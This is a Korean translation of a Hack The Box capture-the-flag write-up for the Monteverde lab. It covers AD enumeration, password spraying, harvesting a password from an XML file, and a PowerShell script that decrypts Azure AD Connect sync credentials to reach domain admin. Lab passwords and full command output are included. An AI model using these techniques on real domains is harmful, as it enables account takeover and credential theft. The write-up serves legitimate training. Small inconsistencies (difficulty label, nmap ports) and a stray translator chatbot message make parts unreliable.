---
layout: post
title: "[HTB][AD][Easy] Monteverde"
date:   2026-11-09 20:59:06 +09:00
categories: [AD, Easy]
---
**날짜:** 2020년 3월 23일 / 문서 번호 D20.100.64 **작성자:** TRX & egre55 **머신 제작자:** egre55 **난이도:** 보통 (Medium) **분류:** 공식 (Official)

### 개요 (Synopsis)

Monteverde는 Azure AD Connect를 특징으로 하는 중간 난이도의 Windows 머신이다. 도메인을 열거하여 사용자 목록을 생성한다. 비밀번호 스프레이(password spraying) 공격을 통해 `SABatchJobs` 서비스 계정이 사용자 이름과 동일한 비밀번호를 사용하고 있음을 알아냅니다. 이 서비스 계정을 사용하여 시스템의 SMB 공유를 열거할 수 있으며, `users$` 공유 폴더가 누구나 읽을 수 있는(world-readable) 상태임을 발견한다. 사용자 폴더 내에서 Azure AD 계정에 사용되는 XML 파일을 발견하며, 여기에는 비밀번호가 포함되어 있다. 비밀번호 재사용으로 인해 WinRM을 사용하여 `mhope` 계정으로 도메인 컨트롤러에 연결할 수 있다. 열거를 통해 Azure AD Connect가 설치되어 있음을 확인한다. 디렉터리 변경 사항을 Azure로 복제하는 계정(이 경우 기본 도메인 관리자)의 자격 증명을 추출할 수 있다.

### 요구 기술 (Skills Required)

* 기본 Windows 열거 (Basic Windows Enumeration)


* 기본 Active Directory 열거 (Basic Active Directory Enumeration)



### 습득 기술 (Skills Learned)

* 비밀번호 스프레이 (Password Spraying)


*
`sqlcmd` 사용


* Azure AD Connect 비밀번호 추출



---

## 열거 (Enumeration)

### Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 -Pn TARGET_IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV TARGET_IP

```



```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-01 06:17 EDT
Nmap scan report for TARGET_IP
Host is up (0.26s latency).

PORT      STATE SERVICE    VERSION
389/tcp   open  ldap       Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
593/tcp   open  ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap       Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49667/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49696/tcp open  unknown
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.07 seconds

```



스캔 결과 포트 53(DNS), 389(LDAP) 및 445(SMB)를 포함하여 많은 포트가 열려 있는 것을 확인할 수 있다. 이를 통해 이 서버가 도메인 컨트롤러임을 알 수 있다. 도메인은 Nmap에 의해 `MEGABANK.LOCAL`로 식별된다.

### 도메인 열거 (Domain Enumeration)

자격 증명 없이 도메인을 열거할 수 있는 LDAP 익명 바인딩(anonymous binds) 또는 SMB null 세션을 확인하는 것이 좋은 첫 단계이다. `windapsearch`를 다운로드한다.

```bash
wget https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py

```



다음으로, 아래 명령을 실행하여 LDAP 익명 바인딩이 허용되는지 확인한다.

```bash
└─$ python windapsearch.py -u "" --dc-ip TARGET_IP
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: TARGET_IP
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[*] Bye!

```



도메인 사용자도 열거할 수 있다.

```bash
python windapsearch.py -u "" --dc-ip TARGET_IP -U --admin-objects
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: TARGET_IP
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 10 users: 

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL

[+] Attempting to enumerate all admin (protected) objects
[+]     Found 0 Admin Objects:


[*] Bye!


```



출력 결과 몇 가지 흥미로운 사용자가 반환된다. `SABatchJobs`는 배치 작업을 실행하기 위한 전용 서비스 계정일 수 있으며, 대소문자가 섞인 이름을 가진 것은 다소 이례적이다. `AAD_987d7f2f57d2` 계정의 존재는 도메인에 AD Connect가 설치되어 있다는 강력한 지표이다. AD Connect는 온프레미스(on-premise) Active Directory 환경을 Azure Active Directory와 동기화하는 데 사용되는 도구이다.

`windapsearch`를 사용하여 도메인 그룹을 추가로 열거하고, 어떤 사용자가 `Remote Management Users` 그룹에 속해 있는지 확인할 수 있다. 이 그룹의 멤버는 PowerShell Remoting을 사용하여 컴퓨터에 연결할 수 있다.

```bash
python windapsearch.py -u "" --dc-ip TARGET_IP -U -m "Remote Management Users"
[+] Found 1 members:
b'CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL'

```



사용자 `mhope`가 `Remote Management Users` 그룹에 속해 있는 것으로 확인된다.

`smbclient`를 사용하여 SMB null 세션을 테스트한다. 명령 출력을 보면 익명 로그인 시도는 성공했지만 공유 폴더를 나열하는 데는 실패했다. 자격 증명을 얻은 후 다시 접근을 시도해 볼 수 있다.

```bash
smbclient -N -L \\\\TARGET_IP\\
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
SMB1 disabled -- no workgroup available

```



`enum4linux`를 사용하여 다른 도메인 정보를 검색한다.

```bash
enum4linux -a TARGET_IP
[+] Password Info for Domain: MEGABANK
[+] Minimum password length: 7
[+] Password history length: 24
[+] Maximum password age: 41 days 23 hours 53 minutes
[+] Password Complexity Flags: 000000
[+] Domain Refuse Password Change: 0
[+] Domain Password Store Cleartext: 0
[+] Domain Password Lockout Admins: 0
[+] Domain Password No Clear Change: 0
[+] Domain Password No Anon Change: 0
[+] Domain Password Complex: 0
[+] Minimum password age: 1 day 4 minutes
[+] Reset Account Lockout Counter: 30 minutes
[+] Locked Account Duration: 30 minutes
[+] Account Lockout Threshold: None
[+] Forced Log off Time: Not Set

```



계정 잠금 임계값(Account Lockout Threshold)이 `None`으로 설정되어 있으므로, 유효한 자격 증명을 얻기 위해 비밀번호 스프레이(password spray) 공격을 시도할 수 있다.

`windapsearch`를 사용하여 도메인 사용자 목록을 생성할 수 있다.

```bash
python windapsearch.py -u "" --dc-ip TARGET_IP -U | grep '@' | cut -d' ' -f 2 | cut -d'@' -f 1 | uniq > users.txt
cat users.txt
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan

```



---

## 초기 침투 (Foothold)

사용자 목록이 준비되었으며, 비밀번호 스프레이 시도를 위해 통계적으로 가능성이 높은 매우 짧은 비밀번호 목록을 사용할 수 있다. 발견된 사용자 이름을 이 목록에 추가하는 것이 좋은데, 안타깝게도 사용자 이름을 비밀번호로 사용하는 것이 일반적인 관행이기 때문이다.

```bash
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
cat users.txt >> english-basic.txt
cat english-basic.txt
Password1
Welcome1
Letmein1
Password123
Welcome123
Letmein123
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan

```



다음으로 `CrackMapExec`를 사용하여 비밀번호 스프레이를 수행할 수 있다. 계정 잠금 정책이 없기 때문에 계정이 잠길 위험은 없다.

```bash
crackmapexec smb TARGET_IP -d megabank -u users.txt -p english-basic.txt
SMB TARGET_IP 445 MONTEVERDE [-] megabank\mhope: Password1 STATUS_LOGON_FAILURE
...
SMB TARGET_IP 445 MONTEVERDE [-] megabank\SABatchJobs: mhope STATUS_LOGON_FAILURE
SMB TARGET_IP 445 MONTEVERDE [+] megabank\SABatchJobs: SABatchJobs

```



공격에 성공하여 유효한 도메인 자격 증명인 `SABatchJobs / SABatchJobs`를 얻었다. 이 계정을 사용하여 서버에서 명령을 실행할 수 있는지 확인한다.

```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H TARGET_IP -x whoami

```



이 명령은 실패한다. 대신 `smbmap`을 사용하여 원격 파일 공유를 열거하면 우리의 권한이 나열된다.

```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H TARGET_IP
[+] IP: TARGET_IP:445 Name: TARGET_IP
Disk            Permissions     Comment
----            -----------     -------
ADMIN$          NO ACCESS       Remote Admin
azure_uploads   READ ONLY
C$              NO ACCESS       Default share
E$              NO ACCESS       Default share
IPC$            READ ONLY       Remote IPC
NETLOGON        READ ONLY       Logon server share
SYSVOL          READ ONLY       Logon server share
users$          READ ONLY

```



이제 Office 문서, 텍스트 및 XML 파일과 같이 흥미로울 수 있는 파일을 찾기 위해 `users$` 공유 폴더를 탐색한다.

```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H TARGET_IP -r --depth 5 -A '(xlsx|docx|txt|xml)'
[|] Traversing
shares...
[/] Traversing
shares...
[+] Match found! Downloading: users$/mhope/azure.xml

```



자동으로 다운로드되는 `azure.xml` 파일을 발견했다.

```xml
cat TARGET_IP-users_mhope_azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>

```



이 파일에는 Azure AD 비밀번호인 `4n0therD4y@n0th3r$`가 포함되어 있다. `mhope`가 로컬 AD에서도 이 비밀번호를 사용하는지 확인한다. 이 계정이 `Remote Management Users` 그룹에 있다는 것을 알고 있으므로 WinRM을 사용하여 자격 증명을 테스트할 수 있다.

```powershell
evil-winrm -i TARGET_IP -u mhope -p '4n0therD4y@n0th3r$'

```



접속에 성공하지만 `whoami /priv` 명령을 확인해 보면 현재 사용자가 권한이 없음을 알 수 있다. 그러나 `whoami /groups`를 통해 이 계정이 `MEGABANK\Azure Admins` 그룹의 구성원임을 확인할 수 있다.
사용자 플래그는 `C:\Users\mhope\Desktop`에 있다.

---

## 권한 상승 (Privilege Escalation)

`C:\Program Files\`로 이동하면 Microsoft SQL Server와 AD Connect가 모두 설치되어 있는 것을 볼 수 있다. Azure AD (AAD) Sync 서비스와 관련된 취약점 및 권한 상승 기회에 대해 온라인에 게시된 문서가 많이 있다.

```powershell
*Evil-WinRM* PS C:\> cd Progra~1
*Evil-WinRM* PS C:\Program Files> ls
Directory: C:\Program Files
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:31 PM                Microsoft SQL Server

```



AD Connect의 버전을 알아본다. Microsoft 문서에 따르면 로컬 AD를 Azure AD와 동기화하는 서비스의 이름은 `ADSync`이다.

https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account

 `Get-Process`를 실행해도 이에 대한 참조가 표시되지 않으며, `tasklist`를 실행하려고 시도하면 Access Denied 오류가 발생한다. PowerShell cmdlet인 `Get-Service`를 사용하거나 `wmic.exe service get name`, `sc.exe query state all`, `net.exe start`를 호출하여 서비스를 열거하려고 시도할 수도 있지만 이 역시 접근이 거부된다.

대신 레지스트리를 사용하여 서비스 인스턴스를 열거할 수 있다.

```powershell
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync

```



```text
Name     Property
----     --------
ADSync   Type              : 16
         Start             : 2
         ErrorControl      : 1
         ImagePath         : "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe"
         DisplayName       : Microsoft Azure AD Sync
         DependOnService   : {winmgmt}
         ObjectName        : MEGABANK\AAD_987d7f2f57d2

```



이를 통해 서비스 바이너리가 `C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe`임을 알 수 있다. 아래 명령을 실행하여 파일(및 제품) 버전을 얻을 수 있다.

```powershell
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
...
InternalName:      miiserver
OriginalFilename:  miiserver.exe
FileVersion:       1.1.882.0
FileDescription:   AD-IAM-HybridSync master (0eb4240d4) Azure AD Connect synchronization service.
Product:           Microsoft® Azure® AD Connect
ProductVersion:    1.1.882.0

```



온라인 검색을 통해 AD Connect Sync 계정의 비밀번호를 추출하는 데 사용할 수 있는 `adconnectdump` 도구를 찾을 수 있다.

https://github.com/dirkjanm/adconnectdump

해당 저장소는 AD Connect가 자격 증명을 저장하는 방식이 얼마 전에 변경되었음을 언급한다. 새 버전은 DPAPI를 사용하여 자격 증명을 저장하고, 이전 버전은 레지스트리를 사용했다. 작성 시점 기준 AD Connect의 최신 버전은 1.5.30.0이므로 서버의 버전이 DPAPI를 사용할 가능성은 낮다. 이 도구는 DPAPI를 사용하는 최신 버전의 AD Connect에서 작동한다.

https://www.microsoft.com/en-us/download/details.aspx?id=47594

추가 검색을 통해 추천할 만한 이 블로그 게시물을 발견할 수 있다. 여기에는 이전 버전의 AD Connect에 대한 악용 과정이 자세히 설명되어 있다. 블로그 게시물에서 스크립트를 복사하여 로컬에 저장한다.

https://blog.xpnsec.com/azuread-connect-for-redteam/

이 스크립트를 그대로 실행하는 것은 실패했다. 데이터베이스에서 `instance_id`, `keyset_id` 및 `entropy` 값을 수동으로 추출한다. AD Connect의 기본 설치는 명명된 파이프(named pipe)를 통해 연결되는 LocalDB로 SQL Server Express 인스턴스를 사용한다. 하지만 `C:\Program Files` 및 `netstat`을 열거해 보면 Microsoft SQL Server가 설치되어 있고 `TARGET_IP`에 바인딩되어 있음을 알 수 있습니다(외부에서는 액세스할 수 없음). 따라서 이것은 AD Connect의 사용자 지정 설치(custom install)였던 것으로 보이다.

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> netstat -nto
Active Connections
Proto  Local Address          Foreign Address        State           PID
TCP    TARGET_IP:135       TARGET_IP:56010     ESTABLISHED     936
...
TCP    TARGET_IP:1433      TARGET_IP:49724     ESTABLISHED     3508
...

```



대신 기본 SQL Server 유틸리티인 `sqlcmd.exe`를 사용하여 데이터베이스에서 값을 추출할 수 있다.

```powershell
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id, keyset_id,entropy from mms_server_configuration"
Changed database context to 'ADSync'.
instance_id                           keyset_id   entropy
------------------------------------  ----------- ------------------------------------
1852B527-DD4F-4ECF-B541-EFCCBFF29E31            1 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)

```



성공적으로 값이 반환되었다.

데이터베이스에서 추출한 값으로 `$key_id`, `$instance_id`, `$entropy` 변수를 설정하도록 스크립트를 수정하고, 해당 값을 자동으로 가져오려는 기존 명령을 제거한다. 스크립트의 첫 번째 줄 뒤에 다음을 추가한다.

```powershell
$key_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"

```



다음 줄들은 제거한다.

```powershell
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

```



다음으로 기존의 `$client` 변수가 사용자 지정 SQL Server를 참조하도록 수정해야 한다.

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE; Database=ADSync; Trusted_Connection=true"

```



스크립트를 호출할 수 있는 함수로 캡슐화한다. 최종 페이로드를 `adconnect.ps1`로 저장한다.

```powershell
Function Get-ADConnectPassword{
    Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
    $key_id = 1
    $instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
    $entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE; Database=ADSync; Trusted_Connection=true"
    $client.Open()
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $config = $reader.GetString(0)
    $crypted = $reader.GetString(1)
    $reader.Close()
    
    add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)
    $key = $null
    $km.GetActiveCredentialKey([ref] $key)
    $key2 = $null
    $km.GetKey(1, [ref]$key2)
    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref] $decrypted)
    
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
    
    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
}

```



Evil-WinRM의 `-s` 플래그를 사용하면 PowerShell 스크립트가 포함된 폴더를 지정할 수 있다. 스크립트 이름을 입력하고 엔터를 눌러 Evil-WinRM 세션 내의 메모리에 스크립트를 로드할 수 있다.

```powershell
evil-winrm -i TARGET_IP -u mhope -p "4n0therD4y@n0th3r$" -s .
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> adconnect.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADConnectPassword
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!

```



성공적으로 실행되었으며, AD Connect Sync 계정에 대한 자격 증명을 얻었다. 이 경우에는 사용자 지정 설치였기 때문에 기본 도메인 관리자가 이에 사용된 것으로 보이다. 기본 설치의 경우 `NT SERVICE\ADSync` 서비스 계정을 사용한다는 점에 유의해야 한다.

Evil WinRM을 사용하여 관리자로 접속한다.

```powershell
evil-winrm -i TARGET_IP -u administrator -p 'd0m@in4dminyeah!'
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```



루트 플래그는 `c:\Users\Administrator\Desktop`에 있다.

---

제가 제공해 드린 번역에서 이 문서에 등장하는 시스템 관련 개념(예: Azure AD Connect의 동작 원리 등) 중 추가로 더 알고 싶은 부분이 있으신가요? (출처 표기는 시스템 규칙상 정보를 인용할 때 반드시 포함하도록 지정되어 있어 부득이하게 추가되었다. 이 점 너른 양해 부탁드립니다!)
